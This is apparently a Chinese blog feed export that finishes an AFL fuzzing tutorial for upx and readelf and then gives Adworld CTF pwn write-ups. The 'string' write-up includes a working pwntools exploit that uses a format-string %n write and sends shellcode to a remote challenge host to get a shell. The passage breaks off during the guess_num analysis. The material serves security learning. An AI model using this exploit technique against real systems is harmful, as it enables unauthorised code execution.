zlib-1.2.11.tar.xz<br><span class="hljs-built_in">cd</span> zlib-1.2.11/<br>./configure<br>sudo make install<br></code></pre></td></tr></table></figure><h4 id="编译upx-1"><a href="#编译upx-1" class="headerlink" title="编译upx"></a>编译upx</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/upx<br>make all<br></code></pre></td></tr></table></figure><p>若没有报错,则编译成功</p><p>此时可在/src目录下找到upx.out文件</p><h3 id="对upx进行fuzz测试"><a href="#对upx进行fuzz测试" class="headerlink" title="对upx进行fuzz测试"></a>对upx进行fuzz测试</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cd ~<br>mkdir afl_in afl_out<br>afl_in存放测试用例,afl_out存放fuzz结果<br>cp <span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">file</span> afl_in<br>#出了个错，进root就好了<br>cp  -r   <span class="hljs-regexp">/home/</span>revo<span class="hljs-regexp">/Desktop/u</span>px  /root<br>cp -r <span class="hljs-regexp">/home/</span>revo<span class="hljs-regexp">/Desktop/</span>afl_in /root<br>cp -r <span class="hljs-regexp">/home/</span>revo<span class="hljs-regexp">/Desktop/</span>afl_out /root<br>afl-fuzz -i afl_in -o afl_out ~<span class="hljs-regexp">/upx/</span>src/upx.out @@<br>@@会代替测试样本,即相当于执行了upx.out <span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>出错</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[-] Looks <span class="hljs-keyword">like</span> the target binary <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> instrumented! The fuzzer <span class="hljs-keyword">depends</span> <span class="hljs-keyword">on</span><br>    compile-<span class="hljs-type">time</span> instrumentation <span class="hljs-keyword">to</span> isolate interesting test cases <span class="hljs-keyword">while</span><br>    mutating the <span class="hljs-keyword">input</span> data. <span class="hljs-keyword">For</span> more information, <span class="hljs-keyword">and</span> <span class="hljs-keyword">for</span> tips <span class="hljs-keyword">on</span> how <span class="hljs-keyword">to</span><br>    instrument binaries, please see /usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">share</span>/doc/afl/README.<br><br>    <span class="hljs-keyword">When</span> source code <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> available, you may be able <span class="hljs-keyword">to</span> leverage QEMU<br>    mode support. Consult the README <span class="hljs-keyword">for</span> tips <span class="hljs-keyword">on</span> how <span class="hljs-keyword">to</span> <span class="hljs-keyword">enable</span> this.<br>    (It <span class="hljs-keyword">is</span> <span class="hljs-keyword">also</span> possible <span class="hljs-keyword">to</span> use afl-fuzz <span class="hljs-keyword">as</span> a traditional, &quot;dumb&quot; fuzzer.<br>    <span class="hljs-keyword">For</span> that, you can use the -n <span class="hljs-keyword">option</span> - but expect much worse results.)<br><br>[-] PROGRAM <span class="hljs-keyword">ABORT</span> : <span class="hljs-keyword">No</span> instrumentation detected<br>         <span class="hljs-keyword">Location</span> : check_binary(), afl-fuzz.c:<span class="hljs-number">6920</span><br></code></pre></td></tr></table></figure><p>解决方法</p><p>看了这个<a href="https://bugs.launchpad.net/ubuntu/+source/afl/+bug/1774816">https://bugs.launchpad.net/ubuntu/+source/afl/+bug/1774816</a></p><p>原来是个bug</p><p>According to Debian bugreport the problem is fixed in gcc-7/7.3.0-18, gcc-8/8.1.0-2</p><p>那就更新gcc</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> update<br>sudo apt-<span class="hljs-builtin-name">get</span> install aptitude<br>sudo aptitude install gcc<br>sudo apt install gcc<br>sudo apt-<span class="hljs-builtin-name">get</span> install g++<br></code></pre></td></tr></table></figure><p>测试安装成功</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">gcc</span> --<span class="hljs-comment">version</span> <br><span class="hljs-comment">g</span>++ --<span class="hljs-comment">version</span> <br></code></pre></td></tr></table></figure><p>运行还是那个报错，换上了我的ubuntu16.04</p><p>同样的错误，用下面这条可解决，<a href="https://groups.google.com/g/afl-users/c/2hC7q8r9eng/m/hqBZUjv_DQAJ?pli=1">https://groups.google.com/g/afl-users/c/2hC7q8r9eng/m/hqBZUjv_DQAJ?pli=1</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">AFL_SKIP_BIN_CHECK</span>=1<br></code></pre></td></tr></table></figure><p>另一个错误</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs delphi">[-] Hmm, looks like the target binary terminated before we could complete a<br>    handshake <span class="hljs-keyword">with</span> the injected code. There are two probable explanations:<br><br>    - The current memory limit (<span class="hljs-number">50.0</span> MB) <span class="hljs-keyword">is</span> too restrictive, causing an OOM<br>      fault <span class="hljs-keyword">in</span> the <span class="hljs-keyword">dynamic</span> linker. This can be fixed <span class="hljs-keyword">with</span> the -m option. A<br>      simple way <span class="hljs-keyword">to</span> confirm the diagnosis may be:<br><br>      ( ulimit -Sv $[<span class="hljs-number">49</span> &lt;&lt; <span class="hljs-number">10</span>]; /path/<span class="hljs-keyword">to</span>/fuzzed_app )<br><br>      Tip: you can use http:<span class="hljs-comment">//jwilk.net/software/recidivm to quickly</span><br>      estimate the required amount <span class="hljs-keyword">of</span> <span class="hljs-keyword">virtual</span> memory <span class="hljs-keyword">for</span> the binary.<br><br>    - Less likely, there <span class="hljs-keyword">is</span> a horrible bug <span class="hljs-keyword">in</span> the fuzzer. <span class="hljs-keyword">If</span> other options<br>      fail, poke &lt;lcamtuf@coredump.cx&gt; <span class="hljs-keyword">for</span> troubleshooting tips.<br><br>[-] <span class="hljs-keyword">PROGRAM</span> ABORT : Fork server handshake failed<br>         Location : init_forkserver(), afl-fuzz.c:<span class="hljs-number">2253</span><br></code></pre></td></tr></table></figure><p>在这<a href="https://groups.google.com/g/afl-users/c/uwO637BD2Fo%E6%89%BE%E5%88%B0%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">https://groups.google.com/g/afl-users/c/uwO637BD2Fo找到解决方法</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">AFL_NO_FORKSRV</span>=1<br></code></pre></td></tr></table></figure><p>又出错</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">[-] PROGRAM <span class="hljs-keyword">ABORT</span> : <span class="hljs-type">No</span> instrumentation detected<br>         Location : <span class="hljs-type">perform_dry_run</span>(), afl-fuzz.c:<span class="hljs-number">2860</span><br></code></pre></td></tr></table></figure><p>long time passed…</p><p>终于找到原因了，复制的锅</p><p>把编译upx 时,下面这句的“？”去掉就好了，浪费我那么长时间，我怒怒</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">CXX    ?= <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>afl-g++ <span class="hljs-comment">#将CXX改成afl-g++</span><br></code></pre></td></tr></table></figure><p>来两张成功的截图</p><p><img src="2020-12-15_173508.png"></p><p><img src="2020-12-15_173652.png"></p><h2 id="无源码的afl-fuzz"><a href="#无源码的afl-fuzz" class="headerlink" title="无源码的afl-fuzz"></a>无源码的afl-fuzz</h2><p>对无源码的程序进行fuzz一般有两种方法:</p><ol><li>对二进制文件进行插桩</li><li>使用-n选项进行传统的fuzz测试</li></ol><p>这里主要介绍第一种,该方法是通过afl-qemu实现的.</p><h3 id="编译afl版的qemu"><a href="#编译afl版的qemu" class="headerlink" title="编译afl版的qemu"></a>编译afl版的qemu</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">cd</span> qemu_mode <br>./build_qemu_sup<span class="hljs-keyword">port</span>.sh<br></code></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt <span class="hljs-keyword">install </span>libtool-<span class="hljs-keyword">bin</span><br><span class="hljs-keyword"></span>sudo apt <span class="hljs-keyword">install </span>automake<br>sudo apt <span class="hljs-keyword">install </span><span class="hljs-keyword">bison</span><br><span class="hljs-keyword"></span>sudo apt-get <span class="hljs-keyword">install </span>libgtk2.<span class="hljs-number">0</span>-dev  <span class="hljs-comment">#glib2</span><br></code></pre></td></tr></table></figure><h3 id="对readelf进行fuzz"><a href="#对readelf进行fuzz" class="headerlink" title="对readelf进行fuzz"></a>对readelf进行fuzz</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir afl_in afl_out<br>cp ~<span class="hljs-regexp">/afl-2.52b/</span>testcases<span class="hljs-regexp">/others/</span>elf/small_exec.elf  afl_in <br><span class="hljs-comment">#afl目录中自带一些常用文件的testcase</span><br>sudo cp <span class="hljs-regexp">/usr/</span>bin/readelf . <br><span class="hljs-comment">#把readelf复制到当前目录中来</span><br>afl-fuzz -i afl_in -o afl_out -Q readelf -a @@<br></code></pre></td></tr></table></figure><p>开始fuzz</p><p><img src="2020-12-15_202020.png"></p><p>参考：</p><p><a href="https://www.cnblogs.com/WangAoBo/p/8280352.html">https://www.cnblogs.com/WangAoBo/p/8280352.html</a></p>]]></content>
    
    
    <categories>
      
      <category>FUZZ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AFL</tag>
      
      <tag>FUZZ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/02/21/adworld_pwn_lasting/"/>
    <url>/2022/02/21/adworld_pwn_lasting/</url>
    
    <content type="html"><![CDATA[<h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./string&quot;)</span><br><span class="hljs-comment">#gdb.attach(proc.pidof(p)[0])</span><br>p = remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,43301)<br><span class="hljs-builtin-name">print</span> p.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>after_content = p.recvuntil(<span class="hljs-string">&quot;What should your character&#x27;s name be:\n&quot;</span>)<br><span class="hljs-builtin-name">print</span> after_content<br>secret_addr = int(after_content.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[0],16)<br>p.sendline(<span class="hljs-string">&quot;test&quot;</span>)<br>addr_wanted = str(secret_addr)<br>shellcode = asm(shellcraft.sh())<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot; addr_wanted:&quot;</span>,addr_wanted)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;So, where you will go?east or up?:\n&quot;</span>,<span class="hljs-string">&quot;east&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>,addr_wanted)<br><span class="hljs-builtin-name">print</span> p.sendlineafter(<span class="hljs-string">&quot;And, you wish is:\n&quot;</span>,<span class="hljs-string">&quot;%85s%7<span class="hljs-variable">$n</span>&quot;</span>)<br><span class="hljs-builtin-name">print</span> p.recvuntil(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL\n&quot;</span>)<br>p.sendline(shellcode)<br><span class="hljs-comment">#print p.sendlineafter(&quot;Wizard: I will help you! USE YOU SPELL\n&quot;,shellcode)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>%c：输出字符，配上%n可用于向指定地址写数据。</p><p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p><p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p><p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p><p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p><p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p><p> %7$n表示将前面输出的字符数（即85）写入偏移7处储存的栈地址所指向空间 </p><p>首先主程序：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino">v3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8uLL</span>);<br>  v4 = (__int64)v3;<br>  *v3 = <span class="hljs-number">68</span>;<br>  v3[<span class="hljs-number">1</span>] = <span class="hljs-number">85</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;we will tell you two secret ...&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;secret[0] is %x\n&quot;</span>, v4, a2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="hljs-number">4</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;do not tell anyone &quot;</span>);<br>  <span class="hljs-built_in">sub_400D72</span>(v4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The End.....Really?&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure><p>跟进sub_400D72(v4);</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">v3 = <span class="hljs-constructor">__readfsqword(0x28u)</span>;<br> puts(<span class="hljs-string">&quot;What should your character&#x27;s name be:&quot;</span>);<br> <span class="hljs-constructor">_isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;<span class="hljs-params">s</span>)</span>;<br> <span class="hljs-keyword">if</span> ( strlen(&amp;s) &lt;= <span class="hljs-number">0xC</span> )<br> &#123;<br>   puts(<span class="hljs-string">&quot;Creating a new player.&quot;</span>);<br>   sub<span class="hljs-constructor">_400A7D()</span>;<br>   fmt<span class="hljs-literal">()</span>;<br>   sub<span class="hljs-constructor">_400CA6((<span class="hljs-params">_DWORD</span> <span class="hljs-operator">*</span>)</span>a1);<br> &#125;<br></code></pre></td></tr></table></figure><p>发现fmt()有fmt_vul</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">puts(<span class="hljs-string">&quot;And, you wish is:&quot;</span>)<span class="hljs-comment">;</span><br>    _isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-symbol">&amp;format</span>)<span class="hljs-comment">;</span><br>    puts(<span class="hljs-string">&quot;Your wish is&quot;</span>)<span class="hljs-comment">;</span><br>    printf(<span class="hljs-name">&amp;format</span>, <span class="hljs-symbol">&amp;format</span>)<span class="hljs-comment">;</span><br>    puts(<span class="hljs-string">&quot;I hear it, I hear it....&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>由<a href="https://www.jianshu.com/p/47d80d34e5ee">函数调用约定</a>可知，在64位程序下，前六个参数从左到右放入<em>RDI</em>, <em>RSI</em>, <em>RDX</em>, <em>ECX</em>, <em>R8</em>, <em>R9</em>中，利用<strong>格式化字符串漏洞</strong>，进入脆弱点，写入<strong>shellcode</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">...[overwrite addr]....<span class="hljs-string">%[overwrite offset]</span>$n<br></code></pre></td></tr></table></figure><p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><p>所以从n = 7开始，我们可以修改栈中的数据为85。</p><p>进入sub_400CA6</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">( *a1 == a1[1] )</span><br> &#123;<br>   puts<span class="hljs-comment">(&quot;Wizard: I will help you! USE YOU SPELL&quot;)</span>;<br>   v<span class="hljs-number">1</span> = mmap<span class="hljs-comment">(0LL, 0x1000uLL, 7, 33, -1, 0LL)</span>;<br>   read<span class="hljs-comment">(0, v1, 0x100uLL)</span>;<br>   <span class="hljs-comment">((void (__fastcall *)</span><span class="hljs-comment">(_QWORD, void *)</span>)v<span class="hljs-number">1</span>)<span class="hljs-comment">(0LL, v1)</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>  其中a1存放的是v3的地址，就是我们v3申请的内存大小为8的内存空间。理顺思路，这里如果我们可以使这8内存的空间中的前四个字节和后四个字节相等，就可以打shellcode。于是我们可以理顺思路，在最开始时拿到两个4字节的地址-&gt;v3[0]和v3[1]的地址，然后在之后的函数中将其中一个修改成和另一个相同-&gt;再在此处打shellcode。exp如下：</p><h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [rsp+Ch] [rbp-34h]</span><br>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0LL</span>);<br>  v4 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  *(_QWORD *)seed = <span class="hljs-built_in">sub_BB0</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------------------------------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to a guess number game!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------------------------------&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please let me know your name!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your name:&quot;</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">gets</span>((__int64)&amp;v7);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  &#123;<br>    v6 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(i + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input your guess number:&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;---------------------------------&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( v4 != v6 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;GG!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">sub_C3E</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>点进V7</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">-<span class="hljs-number">0000000000000030</span> var_30          <span class="hljs-built_in">db</span> ?<br>-000000000000002F                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000002E                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">000000000000002D</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000002C                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000002B                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000002A                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000029</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000028</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000027</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000026</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000025</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000024</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000023</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000022</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000021</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000020</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000001F                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000001E                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">000000000000001D</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000001C                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">000000000000001B</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-000000000000001A                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000019</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000018</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000017</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000016</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; undefined</span><br>-<span class="hljs-number">0000000000000015</span>                 <span class="hljs-built_in">db</span> ? <span class="hljs-comment">; 